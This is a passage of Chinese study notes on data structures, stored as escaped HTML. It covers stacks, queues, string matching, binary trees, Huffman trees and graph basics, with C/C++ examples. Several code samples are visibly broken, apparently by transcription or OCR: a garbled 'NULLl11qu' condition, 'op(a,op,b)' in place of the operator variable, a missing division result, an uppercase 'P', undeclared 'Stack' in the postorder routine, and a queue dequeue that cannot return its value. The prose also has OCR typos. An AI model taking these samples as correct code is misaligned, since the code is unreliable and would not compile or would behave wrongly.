&lt;li&gt;出栈代码&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int pop(SqStack &amp;amp;st, int &amp;amp;x)
{
    if(st.top==-1)
        return 0;
    x=st.data[st.top];
    --(st.top);
        return 1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;链栈&#34;&gt;链栈&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;链栈的要素
(1)状态&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;栈空状态&lt;br&gt;
lst-&amp;gt;next==NULL
(2)操作&lt;/li&gt;
&lt;li&gt;进栈操作&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;p-&amp;gt;next=lst-&amp;gt;next;
lst-&amp;gt;next=p;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;出栈操作&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;p=lst-&amp;gt;next;
x=p-&amp;gt;data;
lst-&amp;gt;next=p-&amp;gt;next;
free(p);
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;链栈的初始化代码&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void initStack(LNode *&amp;amp;lst)
{
    lst=(LNode*)malloc(sizeof(LNode));
    lst-&amp;gt;next=NULL;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;判断栈空代码&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int isEmpty(LNode *lst)
{
    if(lst-&amp;gt;next==NULL)
    {
        return 1;
    }
    else 
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;进栈代码&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void push(LNode *lst, int x)
{
    LNode *p;
    p=(LNode*)malloc(sizeof(LNode));
    p-&amp;gt;next=NULL;

    p-&amp;gt;data=x;
    p-&amp;gt;next=lst-&amp;gt;next;
    lst-&amp;gt;next=p;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;出栈代码&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int pop(LNode *lst, int &amp;amp;x)
{
    LNode *p;
    if(lst-&amp;gt;next==NULL)
        return 0;
    p=lst-&amp;gt;next;
    x=p-&amp;gt;data;
    lst-&amp;gt;next=p-&amp;gt;next;
    free(p);
    return 1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;栈的应用&#34;&gt;栈的应用&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;顺序栈的应用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;【例1】C语言里算术表达式中的括号只有小括号。编写算法，判断一个表达式中的括号是否正确配对，表达式已经存入字符数组exp[]中，表达式中的字符个数为n。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int match(char exp[], int n)
{
    char stack[maxSize];
    int top=-1;
    int i;
    for(i=0;i&amp;lt;n;++i)
    {
        if(exp[i]==&amp;#39;(&amp;#39;){
            stack[++top]=&amp;#39;(&amp;#39;;
        }
        if(exp[i]==&amp;#39;)&amp;#39;)
        {
            if(top==-1){
                return 0;
            }
            else {
                --top;
            }
        }
    }
        if(top==-1){
            return 1;
        }
        else {
            return 0;
        }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;【例2】编写一个函数，求后缀式的数值，其中后缀式存于一个字符数组 exp中，exp中最后一个字符为“10”，作为结束符，并且假设后缀式中的数字都只有一位。&lt;/p&gt;
&lt;p&gt;执行过程:当遇到数值时入栈，当遇到运算符时，连续两次出栈，将两个出栈元素结合运算符进行运算，将结果作为新遇到的数值入栈。如此往复，直到扫描到终止符“10”。此时栈底元素值即为表达式的值。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int op(int a,char Op,int b)
{
    if(Op==&amp;#39;+&amp;#39;) return a+b;
    if(Op==&amp;#39;-&amp;#39;) return a-b;
    if(Op==&amp;#39;*&amp;#39;) return a*b;
    if(Op==&amp;#39;/&amp;#39;)
    {
        if(b==0)
        {
            cout&amp;lt;&amp;lt;&amp;#34;ERROR&amp;#34;&amp;lt;&amp;lt;endl;
            return 0;
        }
    }
}
int com(char exp[])
{
    int i,a,b,c;
    int stack[maxSize];
    int top=-1;
    char Op;
    for(i=0;exp[i]!=&amp;#39;\0&amp;#39;;++i)
    {
        if(exp[i]&amp;gt;=&amp;#39;0&amp;#39;&amp;amp;&amp;amp;exp[i]&amp;lt;=&amp;#39;9&amp;#39;)

            stack[++top]=exp[i]-&amp;#39;0&amp;#39;;
        else
        {
            Op=exp[i];
            b=stack[top--];
            a=stack[top--];
            c=op(a,op,b);
            stack[++top]=c;
        }
    }
    return stack[top];
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;链栈的应用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;【例3-3】用不带头结点的单链表存储链栈，设计初始化栈、判断栈是否为空、进栈和出栈等相应的算法。&lt;/p&gt;
&lt;p&gt;分析：&lt;br&gt;
不带头结点的单链表lst为空的条件是lst==NULL，进栈和出栈操作都是在表头进行的&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void initStackl(LNode *&amp;amp;lst)
{
    lst=NULL;
}
int isEmptyl(LNode *lst)
{
    if(lst==NULL)
        return 1;
    else 
        return 0;
}
void pushl(LNode *&amp;amp;lst, int x)
{
    LNode *p;
    p=(LNode *)malloc(sizeof(LNode));
    p-&amp;gt;next=NULL;
    p-&amp;gt;data=x;
    p-&amp;gt;next=lst;
    lst=p;
}
int popl(LNode *&amp;amp;lst,int &amp;amp;x)
{
    LNode *p;
    if(lst==NULL)
        return 0;
    p=lst;
    x=p-&amp;gt;data;
    lst=p-&amp;gt;next;
    free(p);
    return 1;   
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;顺序队&#34;&gt;顺序队&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;循环队列&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在顺序队中,通常让队尾指针rear 指向刚进队的元素位置,让队首指针front 指向刚出队的元素位置。因此，元素进队时，rear要向后移动;元素出队时，front 也要向后移动。这样经过一系列的出队和进队操作以后,两个指针最终会到达数组末端maxSize-1处。虽然队中已经没有元素，但仍然无法让元素进队，这就是所谓的“假溢出”。要解决这个问题，可以把数组弄成一个环,让 rear和 front沿着环走，这样就永远不会出现两者来到数组尽头无法继续往下走的情况，这样就产生了循环队列。循环队列是改进的顺序队列。&lt;/p&gt;
&lt;p&gt;front=(front+1)%maxSize&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;循环队列的要素&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;(1)两个状态&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;队空状态：qu.rear==qu.front&lt;/li&gt;
&lt;li&gt;队满状态：(qu.rear+1)%maxSize==qu.front
(2)两个操作&lt;/li&gt;
&lt;li&gt;元素x进队操作&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;qu.rear=(qu.rear+1)%maxSize;
qu.data[qu.rear]=x;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;元素x出队操作&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;qu.front=(qu.front+1)%maxSize;
x=qu.data[qu.front];
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;初始化队列算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void initQueue (SqQueue &amp;amp;qu)
{
    qu.front=qu.rear=0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;判断队空算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int isEmpty(SqQueue qu)
{
    if(qu.front==qu.rear)
        return 1;
    else 
        return 0;
}   
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;进队算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int enQueue(SqQueue &amp;amp;qu, int x)
{
    if((qu.rear+1)%maxSize==qu.front)
        return 0;
    qu.rear=(qu.rear+1)%maxSize;
    qu.data[qu.rear]=x;
    return 1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;出队算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int deQueue(SqQueue &amp;amp;qu, int x)
{
    if(qu.front==qu.rear)
        return 0;
    qu.front=(qu.front+1)%maxSize;
    x=qu.data[qu.front];
    return 1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;链队&#34;&gt;链队&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;链队的要素&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;队空状态&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;lqu-&amp;gt;rear==NULL 
lqu-&amp;gt;front==NULL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;元素进队操作&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;lqu-&amp;gt;rear-&amp;gt;next=p;
lqu-&amp;gt;rear=p;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;元素出队操作&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;p=lqu-&amp;gt;front;
lqu-&amp;gt;front=p-&amp;gt;next;
x=p-&amp;gt;data;
free(p);
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;初始化链队算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void initQueue (LiQueue *&amp;amp;lqu)
{
    lqu=(LiQueue*)malloc(sizeof(LiQueue));
    lqu-&amp;gt;front=lqu-&amp;gt;rear=NULL;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;判断队空算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int isQueueEmpty(LiQueue *lqu)
{
    if(lqu-&amp;gt;rear==NULLl11qu-&amp;gt;front==NULL)
        return 1;
    else 
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;进队算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void enQueue(LiQueue *lqu, int x)
{
    QNode *p;
    P=(QNode*)malloc(sizeof(QNode));
    p-&amp;gt;data=x;
    p-&amp;gt;next=NULL;
    if(lqu-&amp;gt;rear==NULL)
        lqu-&amp;gt;front=lqu-&amp;gt;rear=p;
    else
    {
        lqu-&amp;gt;rear-&amp;gt;next=p;
        lqu-&amp;gt;rear=p;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;出队算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int deQueue(LiQueue *lqu,int &amp;amp;x)
{
    QNode *p;
    if(lqu-&amp;gt;rear==NULL)
        return 0;
    else
        p=lqu-&amp;gt;front;
    if(lqu-&amp;gt;front==lqu-&amp;gt;rear)
        lqu-&amp;gt;front=lqu-&amp;gt;rear=NULL;
    else
        lqu-&amp;gt;front=lqu-&amp;gt;front-&amp;gt;next;
    x=p-&amp;gt;data;
    free (p);
    return 1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;串&#34;&gt;串&lt;/h2&gt;
&lt;h3 id=&#34;串数据类型的定义&#34;&gt;串数据类型的定义&lt;/h3&gt;
&lt;h4 id=&#34;串的定义&#34;&gt;串的定义&lt;/h4&gt;
&lt;p&gt;串是由零个或者多个字符组成的有限序列。串中字符的个数称为串的长度，含有零个元素的串叫空串&lt;/p&gt;
&lt;h4 id=&#34;串的存储结构&#34;&gt;串的存储结构&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;定长顺序存储表示&lt;/li&gt;
&lt;li&gt;变长分配存储表示&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;串的基本操作&#34;&gt;串的基本操作&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;赋值操作&lt;/li&gt;
&lt;li&gt;取串长度操作&lt;/li&gt;
&lt;li&gt;串比较操作&lt;/li&gt;
&lt;li&gt;串连接操作&lt;/li&gt;
&lt;li&gt;求字串操作&lt;/li&gt;
&lt;li&gt;串清空操作&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;串的模式匹配算法&#34;&gt;串的模式匹配算法&lt;/h3&gt;
&lt;h4 id=&#34;简单模式匹配算法&#34;&gt;简单模式匹配算法&lt;/h4&gt;
&lt;p&gt;对一个串中某子串的定位操作称为串的模式匹配，其中待定位的子串称为模式串。算法的基本思想:从主串的第一个位置起和模式串的第一个字符开始比较，如果相等，则继续逐一比较后续字符;否则从主串的第二个字符开始，再重新用上一步的方法与模式串中的字符做比较，以此类推，直到比较完模式串中的所有字符。若匹配成功，则返回模式串在主串中的位置;若匹配不成功，则返回一个可区别于主串所有位置的标记，如“0”。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int index(Str str,Str substr)
{
    int i=1,j=1,k=i;
    while(i&amp;lt;=str.length &amp;amp;&amp;amp; j&amp;lt;=substr.length)
    {
        if(str.ch[i]==substr.ch[j])
        {
            ++i;
            ++j;
        }
        else 
        {
            j=1;
            i=++k;
        }
    }
    if(j&amp;gt;substr.length)
        return k;
    else return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;kmp算法&#34;&gt;KMP算法&lt;/h4&gt;
&lt;h4 id=&#34;kmp算法的改进&#34;&gt;KMP算法的改进&lt;/h4&gt;
&lt;h2 id=&#34;树与二叉树&#34;&gt;树与二叉树&lt;/h2&gt;
&lt;h3 id=&#34;树的基本概念&#34;&gt;树的基本概念&lt;/h3&gt;
&lt;h4 id=&#34;树的定义&#34;&gt;树的定义&lt;/h4&gt;
&lt;p&gt;树是一种非线性的数据结构。&lt;/p&gt;
&lt;h4 id=&#34;树的基本用语&#34;&gt;树的基本用语&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/shu1.png&#34; alt=&#34;1&#34;&gt;
结点:A、B、C等都是结点，结点不仅包含数据元素，而且包含指向子树的分支。例如，A结点不仅包含数据元素A，而且包含3个指向子树的指针。&lt;br&gt;
结点的度:结点拥有的子树个数或者分支的个数。例如，A结点有3棵子树，所以A结点的度为3。树的度:树中各结点度的最大值。如例子中结点度最大为3(A、D结点)，最小为0(F、G、I、J、K、L、M结点)，所以树的度为3。&lt;br&gt;
叶子结点:又叫作终端结点，指度为0的结点，如F、G、1、J、K、L、M结点都是叶子结点。非终端结点:又叫作分支结点，指度不为0的结点，如A、B、C、D、E、H结点都是非终端结点。除了根结点之外的非终端结点，也叫作内部结点，如B、C、D、E、H结点都是内部结点。&lt;br&gt;
孩子:结点的子树的根，如A结点的孩子为B、C、D。&lt;br&gt;
双亲:与孩子的定义对应，如B、C、D结点的双亲都是A。&lt;br&gt;
兄弟:同一个双亲的孩子之间互为兄弟。如B、C、D互为兄弟，因为它们都是A结点的孩子。祖先:从根到某结点的路径上的所有结点，都是这个结点的祖先。如K的祖先是A、B、E，因为从A到K的路径为A一B-E─K。&lt;br&gt;
子孙:以某结点为根的子树中的所有结点，都是该结点的子孙。如D的子孙为H、I、J、M.层次:从根开始，根为第一层，根的孩子为第二层，根的孩子的孩子为第三层，以此类推。树的高度(或者深度):树中结点的最大层次。如例子中的树共有4层，所以高度为4。结点的深度和高度:&lt;br&gt;
1）结点的深度是从根结点到该结点路径上的结点个数。&lt;br&gt;
2）从某结点往下走可能到达多个叶子结点，对应了多条通往这些叶子结点的路径，其中最长的那条路径上结点的个数即为该结点在树中的高度,如结点D的高度为3,就是从D到M的路径上的结点个数。&lt;br&gt;
3）根结点的高度为树的高度，如结点A，其高度为4，是从A到K（L、M）这条路径上结点的个数，也是整棵树的高度。&lt;br&gt;
堂兄弟:双亲在同一层的结点互为堂兄弟。如G和H互为堂兄弟，因为G的双亲是C，H的双亲是D，C和D在同一层上。注意和兄弟的概念的区分。&lt;br&gt;
有序树:树中结点的子树从左到右是有次序的，不能交换，这样的树叫作有序树。无序树:树中结点的子树没有顺序，可以任意交换，这样的树叫作无序树。&lt;br&gt;
丰满树:丰满树即理想平衡树，要求除最底层外，其他层都是满的。&lt;br&gt;
森林:若干棵互不相交的树的集合。例子中如果把根A去掉，剩下的3棵子树互不相交，它们组成一个森林。&lt;/p&gt;
&lt;h4 id=&#34;树的存储结构&#34;&gt;树的存储结构&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;顺序存储结构
&lt;img src=&#34;https://xuoneyuan.github.io/images/shu2.png&#34; alt=&#34;1&#34;&gt;&lt;/li&gt;
&lt;li&gt;链式存储结构&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;二叉树&#34;&gt;二叉树&lt;/h3&gt;
&lt;h4 id=&#34;二叉树的定义&#34;&gt;二叉树的定义&lt;/h4&gt;
&lt;p&gt;在理解了树的定义之后，二叉树的定义也就很好理解了。将一般的树加上如下两个限制条件就得到了二叉树。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;每个结点最多只有两棵子树，即二叉树中结点的度只能为0、1、2。&lt;/li&gt;
&lt;li&gt;子树有左右顺序之分，不能颠倒。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;根据二叉树的定义可知，二叉树共有5种基本形态。
&lt;img src=&#34;https://xuoneyuan.github.io/images/shu3.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;在一棵二叉树中，如果所有的分支结点都有左孩子和右孩子结点，并且叶子结点都集中在二叉树的最下一层，则这样的二叉树称为满二叉树。&lt;/p&gt;
&lt;p&gt;如果对一棵深度为k、有n个结点的二叉树进行编号后，各结点的编号与深度为k的满二叉树中相同位置上的结点的编号均相同，那么这棵二叉树就是一棵完全二叉树。&lt;/p&gt;
&lt;h4 id=&#34;二叉树的主要性质&#34;&gt;二叉树的主要性质&lt;/h4&gt;
&lt;p&gt;性质1:非空二叉树上叶子结点数等于双分支结点数加1。&lt;/p&gt;
&lt;p&gt;证明:设二叉树上叶子结点数为n&lt;sub&gt;0&lt;/sub&gt;，单分支结点数为n&lt;sub&gt;1&lt;/sub&gt;，双分支结点数为n&lt;sub&gt;2&lt;/sub&gt;，则总结点数为n&lt;sub&gt;0&lt;/sub&gt;+n&lt;sub&gt;1&lt;/sub&gt;+n&lt;sub&gt;2&lt;/sub&gt;。在一棵二叉树中，所有结点的分支数等于单分支结点数加上双分支结点数的两倍，即总的分支数为n&lt;sub&gt;1&lt;/sub&gt;+2n&lt;sub&gt;2&lt;/sub&gt;。&lt;/p&gt;
&lt;p&gt;由于二叉树中除根结点之外，每个结点都有唯一的一个分支指向它，因此二叉树中有总分支数=总结点数-1（显然这一条结论对于任何树都是适用的，而不仅仅是针对二叉树)。&lt;/p&gt;
&lt;p&gt;由此可得: n&lt;sub&gt;0&lt;/sub&gt;+n&lt;sub&gt;1&lt;/sub&gt;+n&lt;sub&gt;2&lt;/sub&gt;-1=n&lt;sub&gt;1&lt;/sub&gt;+2n&lt;sub&gt;2&lt;/sub&gt;&lt;br&gt;
化简得:n&lt;sub&gt;0&lt;/sub&gt;=n&lt;sub&gt;2&lt;/sub&gt;+1&lt;/p&gt;



&lt;div class=&#34;notice notice-tip&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;Q:二叉树中总的结点数为n，则树中空指针的个数是多少?&lt;br&gt;
A:可以将所有的空指针看作叶子结点，则树中原有的所有结点都成了双分支结点。因此可得空指针的个数为树中所有结点个数加1，即 n+1个。&lt;/p&gt;
&lt;p&gt;总结点数=n&lt;sub&gt;0&lt;/sub&gt;+n&lt;sub&gt;1&lt;/sub&gt;+n&lt;sub&gt;2&lt;/sub&gt;+...+n&lt;sub&gt;m&lt;/sub&gt;&lt;br&gt;
总分支数=1×n&lt;sub&gt;1&lt;/sub&gt;+2×n&lt;sub&gt;2&lt;/sub&gt;+...+m×n&lt;sub&gt;m&lt;/sub&gt;(度为m的结点引出m条分支)&lt;br&gt;
总分支数=总结点数-1&lt;/p&gt;&lt;/div&gt;

&lt;p&gt;性质2:二叉树的第i层上最多有2&lt;sup&gt;i-1&lt;/sup&gt;(i≥1)个结点。&lt;/p&gt;
&lt;p&gt;性质3:高度（或深度）为k的二叉树最多有2&lt;sup&gt;k&lt;/sup&gt;-1(k≥1)个结点。&lt;/p&gt;
&lt;h4 id=&#34;二叉树的存储结构&#34;&gt;二叉树的存储结构&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;顺序存储结构&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;顺序存储结构即用一个数组来存储一棵二叉树，这种存储方式最适合于完全二叉树，用于存储一般二叉树会浪费大量的存储空间。将完全二叉树中的结点值按编号依次存入一个一维数组中，即完成了一棵二叉树的顺序存储。
&lt;img src=&#34;https://xuoneyuan.github.io/images/shu4.png&#34; alt=&#34;1&#34;&gt;
2. 链式存储结构&lt;/p&gt;
&lt;p&gt;其中，data表示数据域，用于存储对应的数据元素；lchild和 rchild分别表示左指针域和右指针域,分别用于存储左孩子结点和右孩子结点的位置。
&lt;img src=&#34;https://xuoneyuan.github.io/images/shu5.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;二叉树的遍历算法&#34;&gt;二叉树的遍历算法&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;先序遍历&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void preorder (BTNode *p)
{
    if(p!=NULL)
    {
        visit(p);
        preorder(p-&amp;gt;lchild);
        preorder(p-&amp;gt;rchild);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;中序遍历&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void inorder (BTNode *p)
{
    if(p!=NULL)
    {
        inorder(p-&amp;gt;lchild);
        visit(p);
        inorder(p-&amp;gt;rchild);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;后序遍历&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void postorder (BTNode *p)
{
    if(p!=NULL)
    {
        postorder(p-&amp;gt;lchild);
        postorder(p-&amp;gt;rchild);
        visit(p);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;二叉树遍历算法的改进&#34;&gt;二叉树遍历算法的改进&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;二叉树深度优先遍历算法的非递归实现&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//先序遍历非递归算法
void preorderNonrecursion(BTNode *bt)
{
    if(bt!=NULL)
    {
        BTNode *Stack[maxSize];
        int top=-1;
        BTNode *p;
        Stack[++top]=bt;
        while(top!=-1)
        {
            p=Stack[top--];
            visit(p);
            if(p-&amp;gt;rchild!=NULL)
                Stack[++top]=p-&amp;gt;rchild;
            if(p-&amp;gt;lchild!=NULL)
                Stack[++top]=p-&amp;gt;lchild;
        }
    }
}
//中序遍历非递归算法
void inorderNonrecursion(BTNode *bt)
{
    if(bt!=NULL)
    {
        BTNode *Stack[maxSize];
        int top=-1;
        BTNode *p;
        p=bt;
        while(top!=-1||p!=NULL)
        {
            while(p!=NULL)
            {
                Stack[++top]=p;
                p=p-&amp;gt;lchild;
            }
            if(top!=-1)
            {
                p=Stack[top--];
                visit(p);
                p=p-&amp;gt;rchild;
            }
        }
    }
}
//后序遍历非递归算法
void postorderNonrecursion(BTNode *bt)
{
    if(bt!=NULL)
    {
        BTNode *Stack1[maxSize];
        int top1=-1;
        BTNode *Stack2[maxSize];
        int top2=-1;
        BTNode *p=NULL;
        Stack[++top1]=bt;
        while(top1!=-1)
        {
            p=Stack[top1--];
            Stack[++top2]=p;
            if(p-&amp;gt;lchild!=NULL)
               Stack1[++top1]=p-&amp;gt;lchild;
            if(p-&amp;gt;rchild!=NULL)
               Stack1[++top1]=p-&amp;gt;rchild;
        }
        while(top2!=-1)
        {
            p=Stack2[top2--];
            visit(p);
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;线索二叉树&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;线索二叉树可以分为前序线索二叉树、中序线索二叉树和后序线索二叉树。对一棵二叉树中所有结点的空指针域按照某种遍历方式加线索的过程叫作线索化,被线索化了的二叉树称为线索二叉树。
&lt;img src=&#34;https://xuoneyuan.github.io/images/shu6.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void InThread(TBTNode *p, TBTNode *&amp;amp;pre)
{
    if(p!=NULL)
    {
        InThread(p-&amp;gt;lchild,pre);
        if(p-&amp;gt;lchild==NULL)
        {
            p-&amp;gt;lchild=pre;
            p-&amp;gt;ltag=1;
        }
        if(pre!=NULL&amp;amp;&amp;amp;pre-&amp;gt;rchild==NULL)
        {
            pre-&amp;gt;rchild=p;
            pre-&amp;gt;rtag=1;
        }
        pre=p;
        p=p-&amp;gt;rchild;
        InThread(p,pre);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;树与二叉树的应用&#34;&gt;树与二叉树的应用&lt;/h3&gt;
&lt;h4 id=&#34;赫夫曼树和赫夫曼编码&#34;&gt;赫夫曼树和赫夫曼编码&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;与赫夫曼树相关的一些概念&lt;br&gt;
赫夫曼树又叫作最优二叉树，它的特点是带权路径最短。首先需要说明几个关于路径的概念。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;路径:路径是指从树中一个结点到另一个结点的分支所构成的路线。&lt;/li&gt;
&lt;li&gt;路径长度:路径长度是指路径上的分支数目。&lt;/li&gt;
&lt;li&gt;树的路径长度:树的路径长度是指从根到每个结点的路径长度之和。&lt;/li&gt;
&lt;li&gt;带权路径长度:结点具有权值，从该结点到根之间的路径长度乘以结点的权值，就是该结点的带又路径长度。&lt;/li&gt;
&lt;li&gt;树的带权路径长度(WPL):树的带权路径长度是指树中斤有叶子结点的带权路径长度之和。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;赫夫曼树的构造方法&lt;br&gt;
给定n个权值，用这n个权值来构造赫夫曼树的算法描述如下:&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;将这n个权值分别看作只有根结点的n棵二叉树，这些二叉树构成的集合记为F。&lt;/li&gt;
&lt;li&gt;从F中选出两棵根结点的权值最小的树（假设为a、b)作为左、右子树，构造一棵新的二叉树(假设为c)，新的二叉树的根结点的权值为左、右子树根结点权值之和。&lt;/li&gt;
&lt;li&gt;从F中删除a、b，加入新构造的树c。&lt;/li&gt;
&lt;li&gt;重复进行2)、3）两步，直到F中只剩下一棵树为止，这棵树就是赫夫曼树。
&lt;img src=&#34;https://xuoneyuan.github.io/images/shu7.png&#34; alt=&#34;1&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;图&#34;&gt;图&lt;/h2&gt;
&lt;h3 id=&#34;图的基本概念&#34;&gt;图的基本概念&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;图&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;图由结点的有穷集合V和边的集合E组成。为了与树形结构进行区别，在图结构中常常将结点称为顶点，边是顶点的有序偶对。若两个顶点之间存在一条边，则表示这两个顶点具有相邻关系。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;有向图和无向图&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有向图，即每条边都有方向;无向图，即每条边都没有方向。&lt;/p&gt;
